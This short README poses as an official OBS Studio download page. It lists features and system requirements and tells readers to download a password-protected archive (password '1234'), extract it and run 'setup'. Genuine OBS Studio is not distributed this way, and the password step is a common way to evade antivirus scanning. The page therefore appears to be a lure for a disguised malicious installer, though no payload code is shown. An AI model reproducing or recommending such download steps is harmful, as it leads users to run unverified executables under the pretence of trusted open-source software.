# OBS Studio

Free and open-source software for live streaming and screen recording, with efficient capture, compositing, encoding, recording, and broadcasting tools for professional content creation.

## Installation
### [Download OBS Studio v32.1.2](https://example.com/obs-studio/releases/latest)
> Archive password: `1234`

- Download the OBS Studio archive from the official download page.
- Extract the archive to a folder on your computer.
- Run `setup` to start the installer.

![OBS Studio](/path/to/pic.png)

## Features

- Free and open-source
- Screen capture and recording
- Live streaming to multiple platforms
- Scene and source layering
- Hotkey support

| Parameter | Minimum |
|---|---|
| OS | Windows 8.1 (64-bit) |
| Free Disk Space | 500 MB |
| RAM | 4 GB |
| CPU | Intel i5 2500K or AMD Ryzen 1300X |
| Video Card | GeForce GTX 900 Series, Radeon RX 400 Series, or Intel HD Graphics 500 |
